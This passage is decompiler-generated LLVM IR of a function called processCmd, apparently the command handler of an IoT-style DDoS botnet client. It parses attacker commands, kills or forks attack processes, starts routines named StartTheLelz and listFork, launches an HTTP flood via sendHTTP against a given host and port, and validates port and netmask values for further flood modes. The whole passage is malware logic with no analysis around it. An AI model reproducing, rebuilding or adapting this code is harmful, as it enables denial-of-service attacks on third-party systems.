  uselistorder label %dec_label_pc_804b8c9, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_804b82c, { 1, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp124 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bd34 = load i32, i32* @edi, align 4
  %v0_804bd35 = load i32, i32* @esi, align 4
  %v0_804bd36 = load i32, i32* @ebx, align 4
  store i32 %v0_804bd36, i32* %stack_var_-16, align 4
  %v5_804bd37 = icmp ult i32* %stack_var_-16, inttoptr (i32 268 to i32*)
  store i1 %v5_804bd37, i1* %cf.global-to-local, align 1
  %v1_804bd40 = inttoptr i32 %tmp124 to i32*
  %v2_804bd40 = load i32, i32* %v1_804bd40, align 4
  store i1 false, i1* @df, align 1
  %v4_804bd5d = inttoptr i32 %v2_804bd40 to i8*
  %v7_804bd6f = call i32 @_strncmp(i8* %v4_804bd5d, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055a6a.146, i32 0, i32 0), i32 5)
  %v8_804bd6f = urem i32 %v7_804bd6f, 2
  %v9_804bd6f = icmp eq i32 %v8_804bd6f, 0
  %v0_804bd71 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bd71 = or i1 %v0_804bd71, %v9_804bd6f
  %v3_804bd71 = zext i1 %v2_804bd71 to i32
  %v4_804bd71 = load i32, i32* @edx, align 4
  %v5_804bd71 = and i32 %v4_804bd71, -256
  %v6_804bd71 = or i32 %v3_804bd71, %v5_804bd71
  %v7_804bd71 = xor i32 %v6_804bd71, 1
  store i32 %v7_804bd71, i32* %edx.global-to-local, align 4
  %v1_804bd79 = trunc i32 %v7_804bd71 to i8
  %v3_804bd79 = zext i1 %v0_804bd71 to i8
  %v4_804bd79 = sub nsw i8 %v1_804bd79, %v3_804bd79
  %v15_804bd79 = icmp eq i8 %v4_804bd79, 0
  %v2_804bd7d = sext i8 %v4_804bd79 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804bd79, label %dec_label_pc_804c859, label %dec_label_pc_804bd88

dec_label_pc_804bd88:                             ; preds = %entry
  %v2_804bd8b = load i32, i32* %v1_804bd40, align 4
  %v4_804bda8 = inttoptr i32 %v2_804bd8b to i8*
  %v7_804bdba = call i32 @_strncmp(i8* %v4_804bda8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055a6f.147, i32 0, i32 0), i32 6)
  %v8_804bdba = urem i32 %v7_804bdba, 2
  %v9_804bdba = icmp eq i32 %v8_804bdba, 0
  %v0_804bdbc = load i1, i1* %cf.global-to-local, align 1
  %v2_804bdbc = or i1 %v0_804bdbc, %v9_804bdba
  %v3_804bdbc = zext i1 %v2_804bdbc to i32
  %v4_804bdbc = load i32, i32* %edx.global-to-local, align 4
  %v5_804bdbc = and i32 %v4_804bdbc, -256
  %v6_804bdbc = or i32 %v3_804bdbc, %v5_804bdbc
  %v7_804bdbc = xor i32 %v6_804bdbc, 1
  store i32 %v7_804bdbc, i32* %edx.global-to-local, align 4
  %v1_804bdc4 = trunc i32 %v7_804bdbc to i8
  %v3_804bdc4 = zext i1 %v0_804bdbc to i8
  %v15_804bdc4 = icmp eq i8 %v1_804bdc4, %v3_804bdc4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bdcd = icmp eq i1 %v15_804bdc4, false
  br i1 %v1_804bdcd, label %dec_label_pc_804beec, label %dec_label_pc_804bdd3

dec_label_pc_804bdd3:                             ; preds = %dec_label_pc_804bd88
  %v1_804bdd6 = add i32 %tmp124, 4
  %v5_804bdd6 = icmp ugt i32 %tmp124, -5
  store i1 %v5_804bdd6, i1* %cf.global-to-local, align 1
  %v1_804bdd9 = inttoptr i32 %v1_804bdd6 to i32*
  %v2_804bdd9 = load i32, i32* %v1_804bdd9, align 4
  store i1 false, i1* @df, align 1
  %v4_804bdf6 = inttoptr i32 %v2_804bdd9 to i8*
  %v7_804be08 = call i32 @_strncmp(i8* %v4_804bdf6, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a75.148, i32 0, i32 0), i32 4)
  %v8_804be08 = urem i32 %v7_804be08, 2
  %v9_804be08 = icmp eq i32 %v8_804be08, 0
  %v0_804be0a = load i1, i1* %cf.global-to-local, align 1
  %v2_804be0a = or i1 %v0_804be0a, %v9_804be08
  %v3_804be0a = zext i1 %v2_804be0a to i32
  %v4_804be0a = load i32, i32* %edx.global-to-local, align 4
  %v5_804be0a = and i32 %v4_804be0a, -256
  %v6_804be0a = or i32 %v3_804be0a, %v5_804be0a
  %v7_804be0a = xor i32 %v6_804be0a, 1
  store i32 %v7_804be0a, i32* @edx, align 4
  %v1_804be12 = trunc i32 %v7_804be0a to i8
  %v3_804be12 = zext i1 %v0_804be0a to i8
  %v15_804be12 = icmp eq i8 %v1_804be12, %v3_804be12
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be1b = icmp eq i1 %v15_804be12, false
  br i1 %v1_804be1b, label %dec_label_pc_804be47, label %dec_label_pc_804be1d

dec_label_pc_804be1d:                             ; preds = %dec_label_pc_804bdd3
  %v0_804be1d = load i32, i32* @global_var_805e750.149, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be22 = icmp eq i32 %v0_804be1d, 0
  br i1 %v1_804be22, label %dec_label_pc_804c859, label %dec_label_pc_804be2a

dec_label_pc_804be2a:                             ; preds = %dec_label_pc_804be1d
  %v0_804be2f = load i32, i32* @esp, align 4
  %v5_804be2f = icmp ult i32 %v0_804be2f, 8
  store i1 %v5_804be2f, i1* %cf.global-to-local, align 1
  store i32 %v0_804be1d, i32* %stack_var_-300, align 4
  %v2_804be35 = call i32 @kill(i32 %v0_804be1d, i32 9)
  %v0_804be3a = load i32, i32* @esp, align 4
  %v2_804be3a = icmp ugt i32 %v0_804be3a, -17
  store i1 %v2_804be3a, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_805e750.149, align 16
  br label %dec_label_pc_804be47

dec_label_pc_804be47:                             ; preds = %dec_label_pc_804bdd3, %dec_label_pc_804be2a
  store i1 %v5_804bdd6, i1* %cf.global-to-local, align 1
  %v2_804be4d = load i32, i32* %v1_804bdd9, align 4
  store i1 false, i1* @df, align 1
  %v4_804be6a = inttoptr i32 %v2_804be4d to i8*
  %v7_804be7c = call i32 @_strncmp(i8* %v4_804be6a, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8055a79.150, i32 0, i32 0), i32 3)
  %v8_804be7c = urem i32 %v7_804be7c, 2
  %v9_804be7c = icmp eq i32 %v8_804be7c, 0
  %v0_804be7e = load i1, i1* %cf.global-to-local, align 1
  %v2_804be7e = or i1 %v0_804be7e, %v9_804be7c
  %v3_804be7e = zext i1 %v2_804be7e to i32
  %v4_804be7e = load i32, i32* @edx, align 4
  %v5_804be7e = and i32 %v4_804be7e, -256
  %v6_804be7e = or i32 %v3_804be7e, %v5_804be7e
  %v7_804be7e = xor i32 %v6_804be7e, 1
  store i32 %v7_804be7e, i32* %edx.global-to-local, align 4
  %v1_804be86 = trunc i32 %v7_804be7e to i8
  %v3_804be86 = zext i1 %v0_804be7e to i8
  %v15_804be86 = icmp eq i8 %v1_804be86, %v3_804be86
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be8f = icmp eq i1 %v15_804be86, false
  br i1 %v1_804be8f, label %dec_label_pc_804beec, label %dec_label_pc_804be91

dec_label_pc_804be91:                             ; preds = %dec_label_pc_804be47
  %v0_804be91 = load i32, i32* @global_var_805e750.149, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be96 = icmp eq i32 %v0_804be91, 0
  %v1_804be98 = icmp eq i1 %v1_804be96, false
  br i1 %v1_804be98, label %dec_label_pc_804c859, label %dec_label_pc_804be9e

dec_label_pc_804be9e:                             ; preds = %dec_label_pc_804be91
  %v1_804be9e = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804beb4 = icmp eq i32 %v1_804be9e, 0
  br i1 %v4_804beb4, label %dec_label_pc_804bed1, label %dec_label_pc_804beba

dec_label_pc_804beba:                             ; preds = %dec_label_pc_804be9e
  store i32 %v1_804be9e, i32* @global_var_805e750.149, align 16
  br label %dec_label_pc_804c859

dec_label_pc_804bed1:                             ; preds = %dec_label_pc_804be9e
  %v0_804bed1 = load i32, i32* @esp, align 4
  %v5_804bed1 = icmp ult i32 %v0_804bed1, 8
  store i1 %v5_804bed1, i1* %cf.global-to-local, align 1
  store i32 10, i32* %stack_var_-300, align 4
  %v2_804beda = call i32 @StartTheLelz(i32 10, i32 1000)
  %v5_804bee2 = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804bee2, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804bee7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804beec:                             ; preds = %dec_label_pc_804be47, %dec_label_pc_804bd88
  %v2_804beef = load i32, i32* %v1_804bd40, align 4
  store i1 false, i1* @df, align 1
  %v4_804bf0c = inttoptr i32 %v2_804beef to i8*
  store i32 %v2_804beef, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8055a7c.151 to i32), i32* @edi, align 4
  %v7_804bf1e = call i32 @_strncmp(i8* %v4_804bf0c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055a7c.151, i32 0, i32 0), i32 5)
  %v8_804bf1e = urem i32 %v7_804bf1e, 2
  %v9_804bf1e = icmp eq i32 %v8_804bf1e, 0
  %v0_804bf20 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf20 = or i1 %v0_804bf20, %v9_804bf1e
  %v3_804bf20 = zext i1 %v2_804bf20 to i32
  %v4_804bf20 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf20 = and i32 %v4_804bf20, -256
  %v6_804bf20 = or i32 %v3_804bf20, %v5_804bf20
  %v7_804bf20 = xor i32 %v6_804bf20, 1
  store i32 %v7_804bf20, i32* @edx, align 4
  %v1_804bf28 = trunc i32 %v7_804bf20 to i8
  %v3_804bf28 = zext i1 %v0_804bf20 to i8
  %v4_804bf28 = sub nsw i8 %v1_804bf28, %v3_804bf28
  %v15_804bf28 = icmp eq i8 %v4_804bf28, 0
  store i1 false, i1* @cf, align 1
  %v1_804bf31 = icmp eq i1 %v15_804bf28, false
  br i1 %v1_804bf31, label %dec_label_pc_804c05d, label %dec_label_pc_804bf37

dec_label_pc_804bf37:                             ; preds = %dec_label_pc_804beec
  %v2_804bf2c = sext i8 %v4_804bf28 to i32
  %v9_804bf37 = icmp ult i32 %tmp105, 5
  store i1 %v9_804bf37, i1* %cf.global-to-local, align 1
  %v7_804bf3b = icmp sgt i32 %tmp105, 5
  br i1 %v7_804bf3b, label %dec_label_pc_804bf41, label %dec_label_pc_804c859

dec_label_pc_804bf41:                             ; preds = %dec_label_pc_804bf37
  %v1_804bf44 = add i32 %tmp124, 12
  %v1_804bf47 = inttoptr i32 %v1_804bf44 to i32*
  %v2_804bf47 = load i32, i32* %v1_804bf47, align 4
  %v0_804bf49 = load i32, i32* @esp, align 4
  %v5_804bf49 = icmp ult i32 %v0_804bf49, 12
  store i1 %v5_804bf49, i1* %cf.global-to-local, align 1
  store i32 %v2_804bf47, i32* %stack_var_-300, align 4
  %v1_804bf4d = call i32 @atol(i32 %v2_804bf47)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v1_804bf4d, 1
  br i1 %tmp143, label %dec_label_pc_804c859, label %dec_label_pc_804bf5d

dec_label_pc_804bf5d:                             ; preds = %dec_label_pc_804bf41
  %v1_804bf60 = add i32 %tmp124, 20
  %v1_804bf63 = inttoptr i32 %v1_804bf60 to i32*
  %v2_804bf63 = load i32, i32* %v1_804bf63, align 4
  %v5_804bf65 = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804bf65, i1* %cf.global-to-local, align 1
  store i32 %v2_804bf63, i32* %stack_var_-300, align 4
  %v1_804bf69 = call i32 @atol(i32 %v2_804bf63)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v1_804bf69, 1
  %tmp145 = icmp eq i1 %tmp144, false
  br i1 %tmp145, label %dec_label_pc_804bf7a, label %dec_label_pc_804c859

dec_label_pc_804bf7a:                             ; preds = %dec_label_pc_804bf5d
  %v0_804bf7a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf7f = icmp eq i32 %v0_804bf7a, 0
  %v1_804bf81 = icmp eq i1 %v1_804bf7f, false
  br i1 %v1_804bf81, label %dec_label_pc_804c859, label %dec_label_pc_804bf87

dec_label_pc_804bf87:                             ; preds = %dec_label_pc_804bf7a
  %v2_804bf8d = load i32, i32* %v1_804bf63, align 4
  %v0_804bf8f = load i32, i32* @esp, align 4
  %v5_804bf8f = icmp ult i32 %v0_804bf8f, 12
  store i1 %v5_804bf8f, i1* %cf.global-to-local, align 1
  store i32 %v2_804bf8d, i32* %stack_var_-300, align 4
  %v1_804bf93 = call i32 @atol(i32 %v2_804bf8d)
  store i32 %v1_804bf93, i32* @esi, align 4
  %v2_804bfa3 = load i32, i32* %v1_804bf47, align 4
  store i1 %v5_804bf65, i1* %cf.global-to-local, align 1
  store i32 %v2_804bfa3, i32* %stack_var_-300, align 4
  %v1_804bfa9 = call i32 @atol(i32 %v2_804bfa3)
  store i32 %v1_804bfa9, i32* %edx.global-to-local, align 4
  %v1_804bfb6 = add i32 %tmp124, 8
  %v1_804bfb9 = inttoptr i32 %v1_804bfb6 to i32*
  %v2_804bfb9 = load i32, i32* %v1_804bfb9, align 4
  %v1_804bfbe = add i32 %tmp124, 4
  %v1_804bfc1 = inttoptr i32 %v1_804bfbe to i32*
  %v2_804bfc1 = load i32, i32* %v1_804bfc1, align 4
  %v0_804bfc3 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804bfc3, i32* @ebx, align 4
  %v5_804bfc9 = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804bfc9, i1* %cf.global-to-local, align 1
  %v0_804bfcc = load i32, i32* @esi, align 4
  store i32 %v1_804bfa9, i32* %stack_var_-300, align 4
  %v6_804bfd6 = call i32 @Rootsprintf(i32 %v0_804bfc3, i32 ptrtoint ([38 x i8]* @global_var_8055a84.152 to i32), i32 %v2_804bfc1, i32 %v2_804bfb9, i32 %v1_804bfa9, i32 %v0_804bfcc)
  %v1_804bfe1 = add i32 %tmp124, 24
  %v1_804bfe4 = inttoptr i32 %v1_804bfe1 to i32*
  %v2_804bfe4 = load i32, i32* %v1_804bfe4, align 4
  store i1 %v5_804bf65, i1* %cf.global-to-local, align 1
  store i32 %v2_804bfe4, i32* %stack_var_-300, align 4
  %v1_804bfea = call i32 @atol(i32 %v2_804bfe4)
  store i32 %v1_804bfea, i32* @ebx, align 4
  %v2_804bffa = load i32, i32* %v1_804bf63, align 4
  store i1 %v5_804bf65, i1* %cf.global-to-local, align 1
  store i32 %v2_804bffa, i32* %stack_var_-300, align 4
  %v1_804c000 = call i32 @atol(i32 %v2_804bffa)
  store i32 %v1_804c000, i32* @esi, align 4
  %v1_804c00d = add i32 %tmp124, 16
  %v1_804c010 = inttoptr i32 %v1_804c00d to i32*
  %v2_804c010 = load i32, i32* %v1_804c010, align 4
  store i32 %v2_804c010, i32* @edi, align 4
  %v2_804c01a = load i32, i32* %v1_804bf47, align 4
  store i1 %v5_804bf65, i1* %cf.global-to-local, align 1
  store i32 %v2_804c01a, i32* %stack_var_-300, align 4
  %v1_804c020 = call i32 @atol(i32 %v2_804c01a)
  %v2_804c036 = load i32, i32* %v1_804bfb9, align 4
  store i32 %v2_804c036, i32* %edx.global-to-local, align 4
  %v2_804c040 = load i32, i32* %v1_804bfc1, align 4
  store i1 %v5_804bfc9, i1* %cf.global-to-local, align 1
  %v0_804c045 = load i32, i32* @ebx, align 4
  %v0_804c046 = load i32, i32* @esi, align 4
  store i32 %v0_804c046, i32* %stack_var_-300, align 4
  %v0_804c047 = load i32, i32* @edi, align 4
  %v6_804c04b = trunc i32 %v1_804c020 to i16
  %v7_804c04b = call i32 @sendHTTP(i32 %v2_804c040, i32 %v2_804c036, i16 %v6_804c04b, i32 %v0_804c047, i32 %v0_804c046, i32 %v0_804c045)
  store i32 %v7_804c04b, i32* @eax, align 4
  store i1 %v5_804bf65, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c058 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c05d

dec_label_pc_804c05d:                             ; preds = %dec_label_pc_804beec, %dec_label_pc_804bf87
  %v2_804c060 = load i32, i32* %v1_804bd40, align 4
  store i1 false, i1* @df, align 1
  %v4_804c07d = inttoptr i32 %v2_804c060 to i8*
  %v7_804c08f = call i32 @_strncmp(i8* %v4_804c07d, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055aaa.153, i32 0, i32 0), i32 4)
  %v8_804c08f = urem i32 %v7_804c08f, 2
  %v9_804c08f = icmp eq i32 %v8_804c08f, 0
  %v0_804c091 = load i1, i1* @cf, align 1
  %v2_804c091 = or i1 %v0_804c091, %v9_804c08f
  %v3_804c091 = zext i1 %v2_804c091 to i32
  %v4_804c091 = load i32, i32* @edx, align 4
  %v5_804c091 = and i32 %v4_804c091, -256
  %v6_804c091 = or i32 %v3_804c091, %v5_804c091
  %v7_804c091 = xor i32 %v6_804c091, 1
  store i32 %v7_804c091, i32* %edx.global-to-local, align 4
  %v1_804c099 = trunc i32 %v7_804c091 to i8
  %v3_804c099 = zext i1 %v0_804c091 to i8
  %v4_804c099 = sub nsw i8 %v1_804c099, %v3_804c099
  %v15_804c099 = icmp eq i8 %v4_804c099, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c0a2 = icmp eq i1 %v15_804c099, false
  br i1 %v1_804c0a2, label %dec_label_pc_804c362, label %dec_label_pc_804c0a8

dec_label_pc_804c0a8:                             ; preds = %dec_label_pc_804c05d
  %v2_804c09d = sext i8 %v4_804c099 to i32
  %v9_804c0a8 = icmp ult i32 %tmp105, 5
  store i1 %v9_804c0a8, i1* %cf.global-to-local, align 1
  %v7_804c0ac = icmp sgt i32 %tmp105, 5
  br i1 %v7_804c0ac, label %dec_label_pc_804c0b2, label %dec_label_pc_804c859

dec_label_pc_804c0b2:                             ; preds = %dec_label_pc_804c0a8
  %v1_804c0b5 = add i32 %tmp124, 12
  %v1_804c0b8 = inttoptr i32 %v1_804c0b5 to i32*
  %v2_804c0b8 = load i32, i32* %v1_804c0b8, align 4
  %v0_804c0ba = load i32, i32* @esp, align 4
  %v5_804c0ba = icmp ult i32 %v0_804c0ba, 12
  store i1 %v5_804c0ba, i1* %cf.global-to-local, align 1
  store i32 %v2_804c0b8, i32* %stack_var_-300, align 4
  %v1_804c0be = call i32 @atol(i32 %v2_804c0b8)
  %v5_804c0c6 = icmp ne i32 %v1_804c0be, -1
  store i1 %v5_804c0c6, i1* %cf.global-to-local, align 1
  %v10_804c0c6 = icmp eq i32 %v1_804c0be, -1
  br i1 %v10_804c0c6, label %dec_label_pc_804c859, label %dec_label_pc_804c0cf

dec_label_pc_804c0cf:                             ; preds = %dec_label_pc_804c0b2
  %v1_804c0d2 = add i32 %tmp124, 8
  %v1_804c0d5 = inttoptr i32 %v1_804c0d2 to i32*
  %v2_804c0d5 = load i32, i32* %v1_804c0d5, align 4
  %v5_804c0d7 = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c0d5, i32* %stack_var_-300, align 4
  %v1_804c0db = call i32 @atol(i32 %v2_804c0d5)
  %v5_804c0e3 = icmp ne i32 %v1_804c0db, -1
  store i1 %v5_804c0e3, i1* %cf.global-to-local, align 1
  %v10_804c0e3 = icmp eq i32 %v1_804c0db, -1
  br i1 %v10_804c0e3, label %dec_label_pc_804c859, label %dec_label_pc_804c0ec

dec_label_pc_804c0ec:                             ; preds = %dec_label_pc_804c0cf
  %v1_804c0ef = add i32 %tmp124, 16
  %v1_804c0f2 = inttoptr i32 %v1_804c0ef to i32*
  %v2_804c0f2 = load i32, i32* %v1_804c0f2, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c0f2, i32* %stack_var_-300, align 4
  %v1_804c0f8 = call i32 @atol(i32 %v2_804c0f2)
  %v5_804c100 = icmp ne i32 %v1_804c0f8, -1
  store i1 %v5_804c100, i1* %cf.global-to-local, align 1
  %v10_804c100 = icmp eq i32 %v1_804c0f8, -1
  br i1 %v10_804c100, label %dec_label_pc_804c859, label %dec_label_pc_804c109

dec_label_pc_804c109:                             ; preds = %dec_label_pc_804c0ec
  %v1_804c10c = add i32 %tmp124, 20
  %v1_804c10f = inttoptr i32 %v1_804c10c to i32*
  %v2_804c10f = load i32, i32* %v1_804c10f, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c10f, i32* %stack_var_-300, align 4
  %v1_804c115 = call i32 @atol(i32 %v2_804c10f)
  %v5_804c11d = icmp ne i32 %v1_804c115, -1
  store i1 %v5_804c11d, i1* %cf.global-to-local, align 1
  %v10_804c11d = icmp eq i32 %v1_804c115, -1
  br i1 %v10_804c11d, label %dec_label_pc_804c859, label %dec_label_pc_804c126

dec_label_pc_804c126:                             ; preds = %dec_label_pc_804c109
  %v2_804c12c = load i32, i32* %v1_804c10f, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c12c, i32* %stack_var_-300, align 4
  %v1_804c132 = call i32 @atol(i32 %v2_804c12c)
  %v1_804c13a = add i32 %v1_804c132, -65536
  %v2_804c13a = icmp ult i32 %v1_804c132, 65536
  %v3_804c13a = sub i32 65535, %v1_804c132
  %v4_804c13a = and i32 %v3_804c13a, %v1_804c132
  %v5_804c13a = icmp slt i32 %v4_804c13a, 0
  store i1 %v2_804c13a, i1* %cf.global-to-local, align 1
  %v6_804c13a = icmp eq i32 %v1_804c13a, 0
  %v7_804c13a = icmp slt i32 %v1_804c13a, 0
  %v3_804c13f = icmp eq i1 %v7_804c13a, %v5_804c13a
  %v4_804c13f = icmp eq i1 %v6_804c13a, false
  %v5_804c13f = and i1 %v4_804c13f, %v3_804c13f
  br i1 %v5_804c13f, label %dec_label_pc_804c859, label %dec_label_pc_804c145

dec_label_pc_804c145:                             ; preds = %dec_label_pc_804c126
  %v2_804c14b = load i32, i32* %v1_804c10f, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c14b, i32* %stack_var_-300, align 4
  %v1_804c151 = call i32 @atol(i32 %v2_804c14b)
  %v1_804c159 = add i32 %v1_804c151, -65500
  %v5_804c159 = icmp ult i32 %v1_804c151, 65500
  %v6_804c159 = sub i32 65499, %v1_804c151
  %v7_804c159 = and i32 %v6_804c159, %v1_804c151
  %v8_804c159 = icmp slt i32 %v7_804c159, 0
  store i1 %v5_804c159, i1* %cf.global-to-local, align 1
  %v9_804c159 = icmp eq i32 %v1_804c159, 0
  %v10_804c159 = icmp slt i32 %v1_804c159, 0
  %v3_804c15e = icmp eq i1 %v10_804c159, %v8_804c159
  %v4_804c15e = icmp eq i1 %v9_804c159, false
  %v5_804c15e = and i1 %v4_804c15e, %v3_804c15e
  br i1 %v5_804c15e, label %dec_label_pc_804c859, label %dec_label_pc_804c164

dec_label_pc_804c164:                             ; preds = %dec_label_pc_804c145
  %v2_804c16a = load i32, i32* %v1_804c0f2, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c16a, i32* %stack_var_-300, align 4
  %v1_804c170 = call i32 @atol(i32 %v2_804c16a)
  %v1_804c178 = add i32 %v1_804c170, -32
  %v2_804c178 = icmp ult i32 %v1_804c170, 32
  %v3_804c178 = sub i32 31, %v1_804c170
  %v4_804c178 = and i32 %v3_804c178, %v1_804c170
  %v5_804c178 = icmp slt i32 %v4_804c178, 0
  store i1 %v2_804c178, i1* %cf.global-to-local, align 1
  %v6_804c178 = icmp eq i32 %v1_804c178, 0
  %v7_804c178 = icmp slt i32 %v1_804c178, 0
  %v3_804c17b = icmp eq i1 %v7_804c178, %v5_804c178
  %v4_804c17b = icmp eq i1 %v6_804c178, false
  %v5_804c17b = and i1 %v4_804c17b, %v3_804c17b
  br i1 %v5_804c17b, label %dec_label_pc_804c859, label %dec_label_pc_804c181

dec_label_pc_804c181:                             ; preds = %dec_label_pc_804c164
  %v8_804c181 = icmp ult i32 %tmp105, 7
  store i1 %v8_804c181, i1* %cf.global-to-local, align 1
  %v12_804c181 = icmp eq i32 %tmp105, 7
  %v1_804c185 = icmp eq i1 %v12_804c181, false
  br i1 %v1_804c185, label %dec_label_pc_804c1a4, label %dec_label_pc_804c187

dec_label_pc_804c187:                             ; preds = %dec_label_pc_804c181
  %v1_804c18a = add i32 %tmp124, 24
  %v1_804c18d = inttoptr i32 %v1_804c18a to i32*
  %v2_804c18d = load i32, i32* %v1_804c18d, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c18d, i32* %stack_var_-300, align 4
  %v1_804c193 = call i32 @atol(i32 %v2_804c18d)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp146 = icmp slt i32 %v1_804c193, 1
  %tmp147 = icmp eq i1 %tmp146, false
  br i1 %tmp147, label %dec_label_pc_804c1a4, label %dec_label_pc_804c859

dec_label_pc_804c1a4:                             ; preds = %dec_label_pc_804c187, %dec_label_pc_804c181
  %v1_804c1a7 = add i32 %tmp124, 4
  %v1_804c1aa = inttoptr i32 %v1_804c1a7 to i32*
  %v2_804c1aa = load i32, i32* %v1_804c1aa, align 4
  %v2_804c1b5 = load i32, i32* %v1_804c0d5, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1b5, i32* %stack_var_-300, align 4
  %v1_804c1bb = call i32 @atol(i32 %v2_804c1b5)
  %v2_804c1cc = load i32, i32* %v1_804c0b8, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1cc, i32* %stack_var_-300, align 4
  %v1_804c1d2 = call i32 @atol(i32 %v2_804c1cc)
  %v2_804c1e3 = load i32, i32* %v1_804c0f2, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1e3, i32* %stack_var_-300, align 4
  %v1_804c1e9 = call i32 @atol(i32 %v2_804c1e3)
  %v2_804c1fa = load i32, i32* %v1_804c10f, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1fa, i32* %stack_var_-300, align 4
  %v1_804c200 = call i32 @atol(i32 %v2_804c1fa)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c20f = icmp sgt i32 %tmp105, 6
  br i1 %v7_804c20f, label %dec_label_pc_804c237, label %dec_label_pc_804c237.thread

dec_label_pc_804c237.thread:                      ; preds = %dec_label_pc_804c1a4
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804c181, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c26c.thread

dec_label_pc_804c237:                             ; preds = %dec_label_pc_804c1a4
  %v1_804c214 = add i32 %tmp124, 24
  %v1_804c217 = inttoptr i32 %v1_804c214 to i32*
  %v2_804c217 = load i32, i32* %v1_804c217, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c217, i32* %stack_var_-300, align 4
  %v1_804c21d = call i32 @atol(i32 %v2_804c217)
  store i32 %v1_804c21d, i32* @esi, align 4
  store i1 %v8_804c181, i1* %cf.global-to-local, align 1
  br i1 %v12_804c181, label %dec_label_pc_804c26c.thread, label %dec_label_pc_804c26c

dec_label_pc_804c26c.thread:                      ; preds = %dec_label_pc_804c237, %dec_label_pc_804c237.thread
  %storemerge25154.ph = phi i32 [ 1000, %dec_label_pc_804c237.thread ], [ %v1_804c21d, %dec_label_pc_804c237 ]
  store i32 1000000, i32* @edi, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2a1

dec_label_pc_804c26c:                             ; preds = %dec_label_pc_804c237
  %v1_804c249 = add i32 %tmp124, 28
  %v1_804c24c = inttoptr i32 %v1_804c249 to i32*
  %v2_804c24c = load i32, i32* %v1_804c24c, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c24c, i32* %stack_var_-300, align 4
  %v1_804c252 = call i32 @atol(i32 %v2_804c24c)
  store i32 %v1_804c252, i32* @edi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c279 = icmp sgt i32 %tmp105, 8
  br i1 %v7_804c279, label %dec_label_pc_804c27b, label %dec_label_pc_804c2a1

dec_label_pc_804c27b:                             ; preds = %dec_label_pc_804c26c
  %v1_804c27e = add i32 %tmp124, 32
  %v1_804c281 = inttoptr i32 %v1_804c27e to i32*
  %v2_804c281 = load i32, i32* %v1_804c281, align 4
  store i1 %v5_804c0d7, i1* %cf.global-to-local, align 1
  store i32 %v2_804c281, i32* %stack_var_-300, align 4
  %v1_804c287 = call i32 @atol(i32 %v2_804c281)
  %v0_804c28c = load i32, i32* @esp, align 4
  %v2_804c28c = icmp ugt i32 %v0_804c28c, -17
  store i1 %v2_804c28c, i1* %cf.global-to-local, align 1
